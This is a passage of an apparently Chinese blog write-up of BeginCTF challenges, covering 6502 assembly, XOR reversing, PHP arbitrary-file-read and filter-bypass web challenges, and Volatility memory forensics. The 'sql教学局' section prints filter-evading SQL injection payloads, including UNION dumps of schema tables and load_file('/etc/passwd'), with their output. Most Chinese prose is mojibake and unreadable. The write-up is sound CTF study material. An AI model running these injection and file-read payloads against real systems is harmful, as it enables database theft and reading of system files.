$300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$08</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$29</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$49</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$69</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$89</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$10</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$30</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$50</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$70</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$90</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$14</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$34</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$54</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$74</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$94</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$18</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$38</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$58</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$78</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$98</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$1C</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$3C</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$5C</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$7C</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$9C</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$BC</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">INX</span><br><span class="line">STA $300,X</span><br><span class="line">LDX #$C0</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$A4</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$84</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$64</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$08</span><br><span class="line">STA $400,X</span><br><span class="line">INX</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$29</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$49</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$89</span><br><span class="line">STA $400,X</span><br><span class="line">LDX #$A9</span><br><span class="line">STA $400,X</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç„¶åæœè¿™å‰å‡ è¡Œä»£ç ï¼Œå°±æœåˆ°äº†ä¸€ä¸ªç½‘ç«™å¥½åƒæ˜¯åœ¨çº¿çš„6502æ±‡ç¼–ï¼Œ</p><p>å°†ä»£ç å¤åˆ¶è¿›å»ï¼Œç„¶åå¸¦ä½ assembleï¼Œç„¶årunå°±å¯ä»¥äº†ã€‚</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240131151527674.png" alt="image-20240131151527674"></p><h6 id="real-checkin-xor"><a href="#real-checkin-xor" class="headerlink" title="real checkin xor"></a>real checkin xor</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def verify_func(ciper,key):</span><br><span class="line">    encrypted = []</span><br><span class="line">    for i in range(len(ciper)):</span><br><span class="line">        encrypted.append(ord(ciper[i])^ord(key[i%len(key)]))</span><br><span class="line">    return encrypted</span><br><span class="line"></span><br><span class="line">secret = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]</span><br><span class="line">print(&quot;è¿™æ˜¯ä¸€ä¸ªä¿é™©ç®±,ä½ èƒ½è¾“å…¥ç›¸å…³çš„keyæ¥è¿›è¡Œè§£å¯†å—?&quot;)</span><br><span class="line">input_line = input(&quot;è¯·è¾“å…¥key &gt; &quot;)</span><br><span class="line">if verify_func(input_line,&quot;ez_python_xor_reverse&quot;) == secret:</span><br><span class="line">    print(&quot;å¯†ç æ­£ç¡®&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;å¯†ç é”™è¯¯&quot;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æºç ç»™äº†ï¼Œæˆ‘æ²¡çŸ¥é“a^b=cï¼Œb^c=a<br>é‚£ä¹ˆå°±å¥½åŠäº†</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">secret = [7, 31, 56, 25, 23, 15, 91, 21, 49, 15, 33, 88, 26, 48, 60, 58, 4, 86, 36, 64, 23, 54, 63, 0, 54, 22, 6, 55, 59, 38, 108, 39, 45, 23, 102, 27, 11, 56, 32, 0, 82, 24]</span><br><span class="line">for i in range(len(secret)):</span><br><span class="line">    decrypted = []</span><br><span class="line">    key=&quot;ez_python_xor_reverse&quot;</span><br><span class="line">    print(chr(ord(key[i%len(key)])^secret[i]),end=&quot;&quot;)</span><br></pre></td></tr></table></figure><h6 id="stick-game"><a href="#stick-game" class="headerlink" title="stick game"></a>stick game</h6><p>ç»™äº†æºç ï¼Œæ˜¯ä¸ªwebå°æ¸¸æˆï¼Œä¸­é—´jsæ··æ·†äº†ï¼Œç”¨<a href="https://obf-io.deobfuscate.io/%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E5%8F%8D%E6%B7%B7%E6%B7%86%E4%B8%80%E4%B8%8B">https://obf-io.deobfuscate.io/è¿™ä¸ªç½‘ç«™åæ··æ·†ä¸€ä¸‹</a><br><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240202112112405.png" alt="image-20240202112112405"></p><h5 id="web"><a href="#web" class="headerlink" title="web"></a>web</h5><h6 id="zupload"><a href="#zupload" class="headerlink" title="zupload"></a>zupload</h6><p>ç»™äº†æç¤º</p><p>æåå¸ˆå‚…æœ€è¿‘æ€»æ˜¯æ”¶åˆ°å¤–å›½å‹äººçš„æ¥ä¿¡ï¼Œä¸ºäº†æ–¹ä¾¿å½¼æ­¤çš„äº¤æµï¼Œä»–å†™äº†ä¸€ä¸ªå‹ç¼©åŒ…ä¸Šä¼ é¡¹ç›®ï¼Œç°åœ¨è¿˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­ï¼Œæƒ³é‚€è¯·ä½ å¯¹ä»–çš„ç½‘ç«™è¿›è¡Œæµ‹è¯•ï¼Œå¹¶è¡¨ç¤ºä»¥åè¦æ˜¯éœ€è¦ç»™å¤–å›½å‹äººå†™ä¿¡å°±åŒ…ç»™ä»–äº†ã€‚æåå¸ˆå‚…éå¸¸èªæ˜ï¼ŒçŸ¥é“é¡¹ç›®è¶Šå¤§å‡ºé—®é¢˜çš„æ¦‚ç‡å°±è¶Šå¤§ï¼Œäºæ˜¯ä»–æŠŠè¿˜æ²¡æœ‰å®ç°ä¸Šä¼ åŠŸèƒ½çš„é¡¹ç›®å‘äº†è¿‡æ¥ï¼Œä½ èƒ½å¸®å¸®ä»–æ‰¾åˆ°ç½‘ç«™çš„æ¼æ´å—ï¼Ÿ</p><p>Author: <code>kdxcxs</code></p><p>Difficulty: <code>baby</code></p><blockquote><p>è¯´æ˜ï¼šæ‰€æœ‰zuploadé¢˜ç›®çš„flagçš„ä½ç½®éƒ½æ˜¯ <code>/flag</code></p></blockquote><p>è€Œä¸”ç»™äº†æºæ–‡ä»¶ï¼Œæˆ‘è¯´æ€ä¹ˆä¸Šä¼ å•¥æ–‡ä»¶éƒ½ç»™æˆ‘æç¤ºé”™è¯¯ï¼Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Not implemented yet&#x27;</span></span><br><span class="line">    ));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç®€å•çœ‹ä¸€ä¸‹ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–å³å¯ï¼Œ</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240201095740234.png" alt="image-20240201095740234"></p><h6 id="zupload-pro"><a href="#zupload-pro" class="headerlink" title="zupload-pro"></a>zupload-pro</h6><p>æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œç›´æ¥ä¼ å³å¯</p><h6 id="zupload-pro-plus"><a href="#zupload-pro-plus" class="headerlink" title="zupload-pro-plus"></a>zupload-pro-plus</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;GET&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>])) &#123;</span><br><span class="line">        header(<span class="string">&#x27;Location: /?action=upload&#x27;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>][<span class="number">0</span>] === <span class="string">&#x27;/&#x27;</span> || strpos(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>], <span class="string">&#x27;..&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;&lt;h1&gt;Invalid action&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_name</span> = <span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_tmp</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_size</span> = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_error</span> = <span class="variable">$file</span>[<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$file_ext</span> = explode(<span class="string">&#x27;.&#x27;</span>, <span class="variable">$file_name</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>[<span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$allowed</span> = <span class="keyword">array</span>(<span class="string">&#x27;zip&#x27;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$file_ext</span>, <span class="variable">$allowed</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file_error</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$file_size</span> &lt;= <span class="number">2097152</span>) &#123;</span><br><span class="line">                <span class="variable">$file_destination</span> = <span class="string">&#x27;uploads/&#x27;</span> . <span class="variable">$file_name</span>;</span><br><span class="line">    </span><br><span class="line">                <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$file_tmp</span>, <span class="variable">$file_destination</span>)) &#123;</span><br><span class="line">                    <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">                        <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;ok&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;File uploaded successfully&#x27;</span>,</span><br><span class="line">                        <span class="string">&#x27;url&#x27;</span> =&gt; preg_split(<span class="string">&#x27;/\?/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="number">0</span>] . <span class="variable">$file_destination</span></span><br><span class="line">                    ));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> json_encode(<span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span> =&gt; <span class="string">&#x27;Only zip files are allowed&#x27;</span></span><br><span class="line">        ));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è§åˆ°é‚£çœ‹ä¸‹æºç ç™½åå•ï¼Œé‚£ä¹ˆè‚¯å®šæ˜¯</p><p> if ($_GET[â€˜actionâ€™][0] === â€˜/â€˜ || strpos($_GET[â€˜actionâ€™], â€˜..â€™) !== false) {<br>        die(â€˜<h1>Invalid action</h1>â€˜);<br>    }<br>    die(file_get_contents($_GET[â€˜actionâ€™]));<br>æƒ³åŠæ³•ç»•ä¸€ä¸‹ï¼Œè¿™é‡Œä¸èƒ½ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯/ ä¸èƒ½æœ‰.. é‚£ä¹ˆç›´æ¥ä¸ºåè®®å³å¯</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240201101216817.png" alt="image-20240201101216817"></p><h6 id="sqlæ•™å­¦å±€"><a href="#sqlæ•™å­¦å±€" class="headerlink" title="sqlæ•™å­¦å±€"></a>sqlæ•™å­¦å±€</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*2123*/group_concat(table_name)/*2123*/frfromom/*2123*/infoorrmation_schema.tables/*2123*/where/*2123*/table_schema/*2123*/like/*2123*/&#x27;secret&#x27;#</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢ç»“æœ: password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*2123*/group_concat(column_name)/*2123*/frfromom/*2123*/infoorrmation_schema.columns/*2123*/where/*2123*/table_schema/*2123*/like/*2123*/&#x27;secret&#x27;/*1123*/||/*1123*/table_name/*1123*/like/*1123*/&#x27;passwoorrd&#x27;#</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢ç»“æœ: id,note,flag</span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*2123*/group_concat(column_name)/*2123*/frfromom/*2123*/infoorrmation_schema.columns/*2123*/where/*2123*/table_schema/*2123*/like/*2123*/&#x27;ctf&#x27;/*1123*/||/*1123*/table_name/*1123*/like/*1123*/&#x27;scoorre&#x27;#</span><br><span class="line">æŸ¥è¯¢ç»“æœ: secret,user,grade,student</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*1123*/group_concat(secret)/*1123*/frfromom/*1123*/secret.passwoorrd#</span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*1123*/group_concat(secret)/*1123*/frfromom/*1123*/ctf.scoorre#</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/selselectect/*1123*/group_concat(flag)/*1123*/frfromom/*1123*/secret.passwoorrd#</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢ç»“æœ: flag&#123;17bbfaba-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&#x27;/*1123*/union/*1123*/all/*1123*/selselectect/*1123*/loloadad_file(&#x27;/etc/passwd&#x27;)#</span><br><span class="line">æŸ¥è¯¢ç»“æœ: -294d4754608e&#125;</span><br><span class="line"></span><br><span class="line">union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;åº“å&#x27; and table_name=&#x27;è¡¨å&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ccf0-d1efdac,28c3fed9f-3c9,8a9bdad19b8dadf,00696ba91fda5a5d,9d41f24ef64-3,ccdce-1ab45cdc,76ff2ef435b6a96,-b-6ac0a39f4,ab12b3fee-8fb4b,dfecc4-bf8055ca,22ee00c357b817b,5adbfb32a93a2d1f,f77a9cfac6bd,84a7a-657ad65f,dabea2ce-5cf97f,da6fcbfe871c47,c8edebcf3-af,019cf7e78443f-2f,560a2-418d6a01f,1fe7cf1756a1-b4,891ffcaddec3bdf2,3-3eeec59bcdef-c,1df3eeed81cc6,d0dfff1175ad53,3bfbba-ed6-fad9d,33d312d307-7625,3ff64ad8fea870,be26c86-b02ce72d,45e7fbd43f06e5c,3c0d9d-de3d0abf,bdd-64baf39ad941,4fbca4fc2f8fb07a,2cdfbd-f89e82f0e,fb7bf57ac3107,0aedf285b4dbdbea,3efb5dc8ce81,e2a6ff9e9d01e5d,cdb37a7-ef-fbf6,1faa-b2cd02eac,5bd9f4f104ddaac,016f63be3453,-ef04e1d87e7,e40fba-c62c676c,b5aaf675c30f-0b9,acdbaeaffbcb9add,be-301cacfbd94,2dda5ae8e2fb1aa,3b97f0e-babe5eee,9cffae2ae7ac,-dafcbcb1f4677,5e2aaacaa5fb,42ca-d74be4cfc59,abcdae95528a2a7,a7d1ec7dad031c,96c57fcc-f1bca1,8fae6d7278da946,363ccfd717a8243,8fdccb47c2fe94aa,0d41c5ef01-14dd,3d5db2cffc2fa263,fcaf9ae386add16,7edffcec72ecc91,9dcefd0f503605db,e237-6fadff4ac8d,6f99a4253e4e,ab84cdfbd3b8</span><br></pre></td></tr></table></figure><p>-1â€™/<em>1123</em>/union/<em>1123</em>/selselectect/<em>2123</em>/group_concat(table_name)/<em>2123</em>/frfromom/<em>2123</em>/infoorrmation_schema.tables/<em>2123</em>/where/<em>2123</em>/table_schema/<em>2123</em>/like/<em>2123</em>/â€˜secretâ€™#</p><h5 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h5><h6 id="é€†å‘å·¥ç¨‹-reverse-å…¥é—¨æŒ‡å—"><a href="#é€†å‘å·¥ç¨‹-reverse-å…¥é—¨æŒ‡å—" class="headerlink" title="é€†å‘å·¥ç¨‹(reverse)å…¥é—¨æŒ‡å—"></a>é€†å‘å·¥ç¨‹(reverse)å…¥é—¨æŒ‡å—</h6><p>æ‰“å¼€pdfï¼Œå•¥ä¹Ÿæ²¡æœ‰ï¼Œåº”è¯¥æ˜¯ç±»ä¼¼äºwordéšå†™é‚£ç§ï¼Œç›´æ¥ctrl a å…¨é€‰pdfé¡µé¢ï¼Œå¤åˆ¶åˆ°è®°äº‹æœ¬å³å¯</p><p><img src="/images/BeginCTF%E9%83%A8%E5%88%86wp/image-20240202085349728.png" alt="image-20240202085349728"></p><h6 id="å­¦å–è¯å’¯"><a href="#å­¦å–è¯å’¯" class="headerlink" title="å­¦å–è¯å’¯"></a>å­¦å–è¯å’¯</h6><p>cmd:cmdscan</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 cmdscan</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: conhost.exe Pid: 2152</span><br><span class="line">CommandHistory: 0x23e290 Application: cmd.exe Flags: Allocated, Reset</span><br><span class="line">CommandCount: 1 LastAdded: 0 LastDisplayed: 0</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x60</span><br><span class="line">Cmd <span class="comment">#0 @ 0x2445d0: echo flag&#123;Cmd_1in3_109_i5_imp0rt@nt&#125;</span></span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: conhost.exe Pid: 2064</span><br><span class="line">CommandHistory: 0x1984c0 Application: flag_is_here.exe Flags: Allocated</span><br><span class="line">CommandCount: 0 LastAdded: -1 LastDisplayed: -1</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x60</span><br><span class="line">**************************************************</span><br><span class="line">CommandProcess: conhost.exe Pid: 1480</span><br><span class="line">CommandHistory: 0x1e6970 Application: wps.exe Flags: Allocated</span><br><span class="line">CommandCount: 0 LastAdded: -1 LastDisplayed: -1</span><br><span class="line">FirstCommand: 0 CommandCountMax: 50</span><br><span class="line">ProcessHandle: 0x60</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> python2 vol.py -f /tools/ctf/misc/begin/quzheng.raw --profile Win7SP1x64 iehistory</span><br><span class="line"></span><br><span class="line">Process: 2912 FTK Imager.exe</span><br><span class="line">Cache <span class="built_in">type</span> <span class="string">&quot;URL &quot;</span> at 0x32e7d80</span><br><span class="line">Record length: 0x280</span><br><span class="line">Location: Visited: 